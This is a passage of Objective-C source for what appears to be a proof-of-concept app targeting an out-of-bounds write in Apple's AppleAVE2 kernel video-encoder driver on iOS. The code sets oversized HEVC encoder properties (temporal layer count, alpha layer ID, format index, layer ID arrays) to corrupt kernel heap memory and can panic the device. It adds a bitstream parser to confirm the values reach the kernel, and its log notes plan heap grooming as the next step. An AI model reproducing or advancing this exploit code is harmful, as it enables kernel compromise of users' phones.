            dumpPropertyValue(shortKey, val, 0);
            CFRelease(val);
        }
        // Also try without prefix
        val = NULL;
        status = VTSessionCopyProperty(session, (__bridge CFStringRef)shortKey, kCFAllocatorDefault, &val);
        if (status == noErr && val) {
            dumpPropertyValue(shortKey, val, 0);
            CFRelease(val);
        }
    }

    // 3. Try setting and reading TemporalLayer count (the off-by-one)
    pocLog(@"");
    LOG(@"=== Off-by-One Test: Temporal Layer Count ===");

    // Try known property keys for temporal layers
    NSArray *temporalKeys = @[
        @"TemporalLayerCount",
        @"MaxTemporalLayers",
        @"NumberOfTemporalLayers",
        @"BaseLayerFrameRate",
        @"BaseLayerFrameRateFraction",
    ];

    for (NSString *tk in temporalKeys) {
        for (int prefix = 0; prefix < 3; prefix++) {
            NSString *fullKey;
            if (prefix == 0) fullKey = tk;
            else if (prefix == 1) fullKey = [NSString stringWithFormat:@"com.apple.videotoolbox.videoencoder.%@", tk];
            else fullKey = [NSString stringWithFormat:@"TemporalCompression_%@", tk];

            // Try to read
            CFTypeRef val = NULL;
            status = VTSessionCopyProperty(session, (__bridge CFStringRef)fullKey, kCFAllocatorDefault, &val);
            if (status == noErr) {
                if (val) {
                    INFO(@"FOUND: %@ = %@", fullKey, (__bridge id)val);
                    CFRelease(val);
                } else {
                    INFO(@"FOUND: %@ = (no value)", fullKey);
                }
            }

            // Try to set various values including the off-by-one boundary
            for (int testVal = 1; testVal <= 9; testVal++) {
                status = VTSessionSetProperty(session, (__bridge CFStringRef)fullKey,
                    (__bridge CFTypeRef)@(testVal));
                if (status == noErr) {
                    INFO(@"SET OK: %@ = %d %s", fullKey, testVal,
                        testVal >= 8 ? "*** OVER PATCHED LIMIT ***" : "");
                }
            }
        }
    }

    // 4. Check for any property with "tile" in the name (num_tile_columns_minus1 target)
    pocLog(@"");
    LOG(@"=== Tile/Slice Properties ===");
    for (NSString *key in sortedKeys) {
        NSString *lk = [key lowercaseString];
        if ([lk containsString:@"tile"] || [lk containsString:@"slice"] ||
            [lk containsString:@"entropy"]) {
            NSDictionary *info = props[key];
            INFO(@"TILE/SLICE: %@", key);
            INFO(@"  Type: %@ RW: %@", info[@"PropertyType"] ?: @"?", info[@"ReadWriteStatus"] ?: @"?");
        }
    }

    CFRelease(propDict);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");
    INFO(@"Property dump complete. Copy logs for analysis.");
    INFO(@"Long-press log → Select All → Copy");
}

static void runAVE2PoC(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  CVE-2026-84607: AppleAVE2 OOB       ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Target: AppleAVE2 v905.40.1 on iOS 26.6.2");
    INFO(@"Bug: Unchecked H.265 params → kernel heap corruption");

    testAVE2_VideoToolbox();
    testAVE2_IOKit();

    pocLog(@"");
    INFO(@"If device panicked, check Settings → Privacy → Analytics → panic logs");
    INFO(@"Or Console.app → iPhone → panic-* logs");
    pocLog(@"");
}

// ============================================================
// OOB Trigger Tests — PANIC CAPABLE
// ============================================================

static void oobOutputCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status != noErr) {
        FAIL(@"OOB encode callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer) {
        PASS(@"Got encoded output after OOB trigger — survived!");
    }
}

static void runTier1OOB(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  TIER 1: Temporal Layer Off-by-One    ║");
    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***       ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Setting NumberOfTemporalLayers = 8 (patched limit: <7)");
    INFO(@"This indexes array[7] in a size-7 kernel array → OOB by 1");
    pocLog(@"");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Session creation failed: %d", (int)status);
        return;
    }
    PASS(@"HEVC session created (320x240, minimal)");

    VTSessionSetProperty(session, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
    VTSessionSetProperty(session, CFSTR("AllowFrameReordering"), kCFBooleanTrue);

    status = VTSessionSetProperty(session,
        CFSTR("NumberOfTemporalLayers"), (__bridge CFTypeRef)@(8));
    INFO(@"Set NumberOfTemporalLayers=8: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    if (status != noErr) {
        FAIL(@"Property rejected at set time");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CFTypeRef readBack = NULL;
    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"Readback: NumberOfTemporalLayers = %@", (__bridge id)readBack);
        CFRelease(readBack);
    }

    INFO(@"PrepareToEncodeFrames...");
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        FAIL(@"PrepareToEncode failed — kernel may have caught OOB at alloc");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer creation failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    pocLog(@"");
    LOG(@"*** ENCODING FRAME WITH TEMPORAL_LAYERS=8 ***");
    INFO(@"If device panics, check panic log for AppleAVE2");
    pocLog(@"");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    for (int i = 1; i <= 3; i++) {
        CVPixelBufferLockBaseAddress(pb, 0);
        y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
        if (y) memset(y, 0x40 + i * 0x20,
            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
            CVPixelBufferGetHeightOfPlane(pb, 0));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        status = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, NULL);
        INFO(@"Frame %d: %d", i, (int)status);
    }

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"Final CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");
    PASS(@"=== Test complete without panic ===");
    INFO(@"OOB write likely hit non-critical heap padding.");
    INFO(@"Next: heap grooming to place controlled object adjacent.");
}

// ============================================================
// Bitstream Oracle
// Extracts VPS/SPS/PPS from encoded output and parses key fields.
// A value is "delivered to kernel" ONLY if it appears in both
// readback AND the emitted bitstream.
//
// Lesson from NumberOfTemporalLayers: SET OK ≠ stored,
// and stored ≠ delivered. Must verify at every layer.
// ============================================================

static void dumpParamSetHex(const uint8_t *data, size_t len, NSString *label) {
    NSMutableString *hex = [NSMutableString string];
    for (size_t i = 0; i < len && i < 64; i++) {
        [hex appendFormat:@"%02x ", data[i]];
        if ((i + 1) % 16 == 0) [hex appendString:@"\n          "];
    }
    if (len > 64) [hex appendFormat:@"... (%zu more bytes)", len - 64];
    INFO(@"%@ (%zu bytes):\n          %@", label, len, hex);
}

// === Bit-accurate HEVC VPS parser with emulation prevention removal ===

static uint8_t *strip_emulation_prevention(const uint8_t *src, size_t src_len, size_t *out_len) {
    uint8_t *dst = (uint8_t *)malloc(src_len);
    if (!dst) { *out_len = 0; return NULL; }
    size_t di = 0;
    for (size_t si = 0; si < src_len; si++) {
        if (si + 2 < src_len && src[si] == 0 && src[si+1] == 0 && src[si+2] == 3) {
            dst[di++] = 0;
            dst[di++] = 0;
            si += 2;
        } else {
            dst[di++] = src[si];
        }
    }
    *out_len = di;
    return dst;
}

typedef struct { const uint8_t *data; size_t len; size_t bit_pos; } BitReader;

static uint32_t br_read(BitReader *br, int n) {
    uint32_t val = 0;
    for (int i = 0; i < n; i++) {
        size_t byte_idx = br->bit_pos / 8;
        int bit_idx = 7 - (br->bit_pos % 8);
        if (byte_idx < br->len)
            val = (val << 1) | ((br->data[byte_idx] >> bit_idx) & 1);
        else
            val <<= 1;
        br->bit_pos++;
    }
    return val;
}

static uint32_t br_read_ue(BitReader *br) {
    int lz = 0;
    while (br_read(br, 1) == 0 && lz < 32) lz++;
    if (lz == 0) return 0;
    return (1u << lz) - 1 + br_read(br, lz);
}

static void parseHEVCVPS(const uint8_t *raw, size_t raw_len) {
    if (raw_len < 6) { INFO(@"  VPS too short"); return; }

    size_t rbsp_len = 0;
    uint8_t *rbsp = strip_emulation_prevention(raw, raw_len, &rbsp_len);
    if (!rbsp) { INFO(@"  RBSP alloc failed"); return; }

    INFO(@"  (raw %zu bytes → RBSP %zu bytes, %zu EP bytes removed)",
        raw_len, rbsp_len, raw_len - rbsp_len);

    BitReader br = {rbsp, rbsp_len, 0};

    br_read(&br, 1);
    uint32_t nal_type = br_read(&br, 6);
    br_read(&br, 6);
    br_read(&br, 3);
    INFO(@"  NAL type: %u (expect 32=VPS)", nal_type);

    uint32_t vps_id = br_read(&br, 4);
    br_read(&br, 1);
    br_read(&br, 1);
    uint32_t max_layers_minus1 = br_read(&br, 6);
    uint32_t max_sub_layers_minus1 = br_read(&br, 3);
    uint32_t temporal_nesting = br_read(&br, 1);
    br_read(&br, 16);

    INFO(@"  vps_id: %u", vps_id);
    INFO(@"  vps_max_layers_minus1: %u", max_layers_minus1);
    INFO(@"  vps_max_sub_layers_minus1: %u", max_sub_layers_minus1);
    INFO(@"  vps_temporal_id_nesting_flag: %u", temporal_nesting);

    br_read(&br, 2 + 1 + 5 + 32 + 4 + 44 + 8);

    if (max_sub_layers_minus1 > 0) {
        uint8_t profile_present[7], level_present[7];
        for (uint32_t i = 0; i < max_sub_layers_minus1; i++) {
            profile_present[i] = br_read(&br, 1);
            level_present[i] = br_read(&br, 1);
        }
        if (max_sub_layers_minus1 < 8)
            for (uint32_t i = max_sub_layers_minus1; i < 8; i++)
                br_read(&br, 2);
        for (uint32_t i = 0; i < max_sub_layers_minus1; i++) {
            if (profile_present[i]) br_read(&br, 2+1+5+32+4+44);
            if (level_present[i]) br_read(&br, 8);
        }
    }

    uint32_t ordering_present = br_read(&br, 1);
    uint32_t start_i = ordering_present ? 0 : max_sub_layers_minus1;
    for (uint32_t i = start_i; i <= max_sub_layers_minus1; i++) {
        uint32_t dpb = br_read_ue(&br);
        uint32_t reorder = br_read_ue(&br);
        uint32_t latency = br_read_ue(&br);
        INFO(@"  sublayer[%u]: dpb=%u reorder=%u latency=%u", i, dpb, reorder, latency);
    }

    uint32_t vps_max_layer_id = br_read(&br, 6);
    uint32_t vps_num_layer_sets_minus1 = br_read_ue(&br);

    INFO(@"  *** vps_max_layer_id: %u (patch limit: <63) ***", vps_max_layer_id);
    INFO(@"  vps_num_layer_sets_minus1: %u", vps_num_layer_sets_minus1);

    if (vps_max_layer_id >= 63) {
        PASS(@"  >>> OVER PATCH LIMIT! vps_max_layer_id=%u >= 63 <<<", vps_max_layer_id);
    }

    for (uint32_t i = 1; i <= vps_num_layer_sets_minus1 && i < 64; i++)
        for (uint32_t j = 0; j <= vps_max_layer_id && j < 64; j++)
            br_read(&br, 1);

    uint32_t timing_present = br_read(&br, 1);
    INFO(@"  vps_timing_info_present_flag: %u", timing_present);

    if (!timing_present) {
        uint32_t ext_flag = br_read(&br, 1);
        INFO(@"  vps_extension_flag: %u", ext_flag);

        if (ext_flag && max_layers_minus1 > 0) {
            INFO(@"  --- VPS Extension (multi-layer) ---");
            if (br.bit_pos / 8 < rbsp_len) {
                size_t ext_start = br.bit_pos;
                uint32_t ext_alignment = br_read(&br, 1);
                uint32_t splitting_flag = br_read(&br, 1);
                INFO(@"  vps_extension_alignment: %u", ext_alignment);
                INFO(@"  splitting_flag: %u", splitting_flag);

                uint32_t num_scalability_types = 0;
                uint32_t scalability_mask = 0;
                for (int d = 0; d < 16; d++) {
                    uint32_t bit = br_read(&br, 1);
                    scalability_mask |= (bit << d);
                    num_scalability_types += bit;
                }
                INFO(@"  scalability_mask: 0x%04x (%u types)", scalability_mask, num_scalability_types);

                if (!splitting_flag) {
                    for (uint32_t d = 0; d < num_scalability_types - 1 && d < 15; d++) {
                        uint32_t dim_id_len = br_read(&br, 3);
                        INFO(@"  dimension_id_len[%u]: %u", d, dim_id_len);
                    }
                }

                uint32_t nuh_layer_id_present = br_read(&br, 1);
                INFO(@"  vps_nuh_layer_id_present_flag: %u", nuh_layer_id_present);

                for (uint32_t i = 1; i <= max_layers_minus1 && i < 64; i++) {
                    uint32_t layer_nuh_id = 0;
                    if (nuh_layer_id_present)
                        layer_nuh_id = br_read(&br, 6);
                    INFO(@"  layer_id_in_nuh[%u]: %u", i, layer_nuh_id);
                }

                INFO(@"  (parsed %zu extension bits)", br.bit_pos - ext_start);
            }
        }
    }

    free(rbsp);
}

// Parse HEVC SPS header and extract key fields
static void parseHEVCSPS(const uint8_t *data, size_t len) {
    if (len < 4) { INFO(@"  SPS too short to parse"); return; }

    uint8_t nal_type = (data[0] >> 1) & 0x3F;
    INFO(@"  NAL type: %d (expect 33=SPS)", nal_type);

    // SPS payload starts at byte 2
    // sps_video_parameter_set_id[4], sps_max_sub_layers_minus1[3],
    // sps_temporal_id_nesting_flag[1]
    if (len < 3) return;
    uint8_t sps_vps_id = (data[2] >> 4) & 0x0F;
    uint8_t sps_max_sub_layers = (data[2] >> 1) & 0x07;
    INFO(@"  sps_vps_id: %d", sps_vps_id);
    INFO(@"  sps_max_sub_layers_minus1: %d", sps_max_sub_layers);
}

// Extract and parse parameter sets from encoded output
static void bitstreamOracle(CMSampleBufferRef sampleBuffer, NSString *context) {
    if (!sampleBuffer) return;

    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
    if (!fmt) {
        INFO(@"[Oracle/%@] No format description in output", context);
        return;
    }

    INFO(@"[Oracle/%@] Extracting parameter sets from encoded output...", context);

    size_t paramCount = 0;
    OSStatus status = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
        fmt, 0, NULL, NULL, &paramCount, NULL);

    if (status != noErr && status != -12712) {
        INFO(@"[Oracle/%@] GetHEVCParameterSet failed: %d (may be H.264)", context, (int)status);
        return;
    }

    INFO(@"[Oracle/%@] Parameter set count: %zu", context, paramCount);

    for (size_t i = 0; i < paramCount; i++) {
        const uint8_t *paramData = NULL;
        size_t paramLen = 0;
        int nalUnitHeaderLen = 0;

        status = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fmt, i, &paramData, &paramLen, NULL, &nalUnitHeaderLen);

        if (status != noErr || !paramData) {
            INFO(@"[Oracle/%@] Param set %zu: read failed (%d)", context, i, (int)status);
            continue;
        }

        NSString *label;
        if (paramLen >= 2) {
            uint8_t nalType = (paramData[0] >> 1) & 0x3F;
            switch (nalType) {
                case 32: label = @"VPS"; break;
                case 33: label = @"SPS"; break;
                case 34: label = @"PPS"; break;
                default: label = [NSString stringWithFormat:@"NAL-%d", nalType]; break;
            }
        } else {
            label = [NSString stringWithFormat:@"Set-%zu", i];
        }

        dumpParamSetHex(paramData, paramLen, label);

        // Parse known types
        if (paramLen >= 2) {
            uint8_t nalType = (paramData[0] >> 1) & 0x3F;
            if (nalType == 32) parseHEVCVPS(paramData, paramLen);
            if (nalType == 33) parseHEVCSPS(paramData, paramLen);
        }
    }
}

// Shared state for oracle callback
static NSString *g_oracleContext = nil;

static void oracleOutputCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status != noErr) {
        FAIL(@"[Oracle] Encode callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer) {
        PASS(@"[Oracle] Got encoded output");
        bitstreamOracle(sampleBuffer, g_oracleContext ?: @"unknown");
    }
}

// ============================================================
// Verification flow: readback + bitstream oracle
// ============================================================

static void runVerifyAndTrigger(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  VERIFY: Readback + Bitstream Oracle  ║");
    pocLog(@"║  Proves whether values reach kernel    ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Lesson from NTL=8: SET OK != stored, stored != delivered.");
    INFO(@"Must verify at every layer before concluding 'exploitable'.");
    pocLog(@"");

    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    // === BASELINE: encode with defaults, capture VPS/SPS ===
    LOG(@"=== BASELINE: Default VPS/SPS ===");
    g_oracleContext = @"BASELINE";

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oracleOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Baseline session failed: %d", (int)status);
        return;
    }

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        FAIL(@"Baseline prepare failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);
    if (!pb) { FAIL(@"Pixel buffer failed"); return; }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    pocLog(@"");

    // === TEST A: AlphaLayerID=64 ===
    LOG(@"=== TEST A: AlphaLayerID=64 (limit <63) ===");

    // Step 1: Set
    status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oracleOutputCallback, NULL, &session);
    if (status != noErr) { FAIL(@"Session failed"); CVPixelBufferRelease(pb); return; }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        (__bridge CFTypeRef)@(64));
    INFO(@"A.1 SET AlphaLayerID=64: %s", status == noErr ? "OK" : "REJECTED");

    // Step 2: Readback
    CFTypeRef readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        int val = [(__bridge NSNumber *)readBack intValue];
        if (val == 64) {
            PASS(@"A.2 READBACK: 64 — NOT clamped");
        } else {
            FAIL(@"A.2 READBACK: %d — CLAMPED (dead end)", val);
        }
        CFRelease(readBack);
    } else {
        INFO(@"A.2 READBACK: nil (property may not be readable)");
    }

    // Step 3: Encode and capture bitstream
    g_oracleContext = @"AlphaLayerID=64";
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"A.3 PrepareToEncode: %d", (int)status);

    if (status == noErr) {
        VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        INFO(@"A.4 Compare VPS hex above with BASELINE — any difference?");
    } else {
        INFO(@"A.3 PrepareToEncode failed — trying with EncodesAlpha=YES");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);

        status = VTCompressionSessionCreate(
            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            oracleOutputCallback, NULL, &session);
        VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(64));
        VTSessionSetProperty(session, CFSTR("EncodesAlpha"), kCFBooleanTrue);
        status = VTCompressionSessionPrepareToEncodeFrames(session);
        INFO(@"A.3b PrepareToEncode (with alpha): %d", (int)status);
        if (status == noErr) {
            VTCompressionSessionEncodeFrame(session, pb,
                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        }
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    pocLog(@"");

    // === TEST B: RepFormatIndex=10 ===
    LOG(@"=== TEST B: RepFormatIndex=10 (limit <2) ===");

    status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oracleOutputCallback, NULL, &session);
    if (status != noErr) { FAIL(@"Session failed"); CVPixelBufferRelease(pb); return; }

    status = VTSessionSetProperty(session,
        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
        (__bridge CFTypeRef)@(10));
    INFO(@"B.1 SET RepFormatIndex=10: %s", status == noErr ? "OK" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        int val = [(__bridge NSNumber *)readBack intValue];
        if (val == 10) {
            PASS(@"B.2 READBACK: 10 — NOT clamped");
        } else {
            FAIL(@"B.2 READBACK: %d — CLAMPED (dead end)", val);
        }
        CFRelease(readBack);
    } else {
        INFO(@"B.2 READBACK: nil");
    }

    g_oracleContext = @"RepFormatIndex=10";
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"B.3 PrepareToEncode: %d", (int)status);

    if (status == noErr) {
        VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        INFO(@"B.4 Compare SPS hex above with BASELINE — any difference?");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    pocLog(@"");

    // === TEST C: Struct-typed properties (CFArray — harder to clamp) ===
    LOG(@"=== TEST C: MVHEVCVideoLayerIDs (array type) ===");

    status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oracleOutputCallback, NULL, &session);
    if (status != noErr) { FAIL(@"Session failed"); CVPixelBufferRelease(pb); return; }

    // Try setting MVHEVCVideoLayerIDs to an array with an over-limit value
    NSArray *layerIDs = @[@(0), @(100)];
    status = VTSessionSetProperty(session,
        CFSTR("MVHEVCVideoLayerIDs"),
        (__bridge CFTypeRef)layerIDs);
    INFO(@"C.1 SET MVHEVCVideoLayerIDs=[0,100]: %s",
        status == noErr ? "OK" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("MVHEVCVideoLayerIDs"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"C.2 READBACK: %@", (__bridge id)readBack);
        CFRelease(readBack);
    } else {
        INFO(@"C.2 READBACK: nil");
    }

    // Also try UserDPBFramesForFaceTime
    status = VTSessionSetProperty(session,
        CFSTR("UserDPBFramesForFaceTime"),
        (__bridge CFTypeRef)@(20));
    INFO(@"C.3 SET UserDPBFramesForFaceTime=20: %s",
        status == noErr ? "OK" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("UserDPBFramesForFaceTime"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"C.4 READBACK: %@", (__bridge id)readBack);
        CFRelease(readBack);
    }

    // Try UserRPSForFaceTime
    status = VTSessionSetProperty(session,
        CFSTR("UserRPSForFaceTime"),
        (__bridge CFTypeRef)@(100));
    INFO(@"C.5 SET UserRPSForFaceTime=100: %s",
        status == noErr ? "OK" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("UserRPSForFaceTime"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"C.6 READBACK: %@", (__bridge id)readBack);
        CFRelease(readBack);
    }

    // Try UserParameterSetsIds
    status = VTSessionSetProperty(session,
        CFSTR("UserParameterSetsIds"),
        (__bridge CFTypeRef)@(50));
    INFO(@"C.7 SET UserParameterSetsIds=50: %s",
        status == noErr ? "OK" : "REJECTED");

    readBack = NULL;
    VTSessionCopyProperty(session,
        CFSTR("UserParameterSetsIds"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        INFO(@"C.8 READBACK: %@", (__bridge id)readBack);
        CFRelease(readBack);
    }

    g_oracleContext = @"StructTyped";
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status == noErr) {
        VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    CVPixelBufferRelease(pb);

    pocLog(@"");
    LOG(@"=== VERDICT ===");
    INFO(@"Compare each test's VPS/SPS hex with BASELINE.");
    INFO(@"If VPS/SPS bytes DIFFER → value reached the bitstream.");
    INFO(@"If IDENTICAL → encoder ignored the property (match filter?).");
    INFO(@"Only properties that pass BOTH readback AND bitstream");
    INFO(@"are proven delivered to the kernel driver.");
    pocLog(@"");
    INFO(@"Copy full log for analysis: long-press → Select All → Copy");
}

// ============================================================
// ESCALATION: AlphaLayerID sweep + MVHEVCVideoLayerIDs oracle
// ============================================================

static void escalationOracleCallback(
    void *ctx, void *sourceFrameRefCon, OSStatus status,
    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
    if (status != noErr) {
        FAIL(@"[Escalation] Encode callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer) {
        PASS(@"[Escalation] Got encoded output");
        bitstreamOracle(sampleBuffer, g_oracleContext ?: @"unknown");
    }
}

static CVPixelBufferRef createTestPixelBuffer(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);
    if (!pb) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static void runEscalation(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  ESCALATION: AlphaLayerID Sweep       ║");
    pocLog(@"║  + MVHEVCVideoLayerIDs Oracle          ║");
    pocLog(@"║  + FaceTime Mode Retry                 ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");
    INFO(@"Goal: prove vps_max_layer_id tracks AlphaLayerID value");
    INFO(@"and exceeds patch limit (<63) in emitted bitstream.");
    pocLog(@"");

    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

